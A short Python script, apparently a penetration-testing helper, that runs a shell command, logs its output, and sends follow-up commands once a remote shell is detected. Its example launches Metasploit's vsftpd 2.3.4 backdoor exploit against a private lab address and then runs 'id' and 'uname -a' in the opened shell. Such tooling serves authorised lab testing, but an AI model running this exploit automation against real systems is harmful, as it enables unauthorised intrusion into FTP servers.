import subprocess
from datetime import datetime
import time
import re

def execute_command(command, timeout=30, user_input=None, follow_up_commands=None):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"test_results_{timestamp}.txt"
    shell_detected = False

    try:
        with open(filename, 'w', encoding='utf-8') as f:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, universal_newlines=True)
            
            # Providing initial user input if any
            if user_input:
                process.stdin.write(user_input)
                process.stdin.flush()

            start_time = time.time()
            while True:
                current_time = time.time()
                if shell_detected and follow_up_commands:
                    for cmd in follow_up_commands:
                        process.stdin.write(cmd)
                        process.stdin.flush()
                        time.sleep(1)  # Adding a slight delay to ensure commands are processed
                    follow_up_commands = None  # Clear follow-up commands to prevent re-execution
                
                if process.poll() is not None or current_time - start_time > timeout:
                    break  # Exit loop if process has finished or timeout reached

                line = process.stdout.readline()
                if line:
                    print(line, end='')  # Printing line for real-time feedback
                    f.write(line)  # Writing the output to a file
                    f.flush()  # Ensuring the written content is flushed from buffer to disk

                    if re.search(r'Shell.*opened', line, re.IGNORECASE):
                        shell_detected = True
                        print("\nShell detected in command output. Keeping the session active for further interaction.")

            # Note: Process is not terminated here to allow further interaction
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    return filename, shell_detected

# Example usage
if __name__ == "__main__":
    test_command = 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit"'
    follow_up_commands = ['id\n', 'uname -a']
    _, shell_detected = execute_command(test_command, follow_up_commands=follow_up_commands)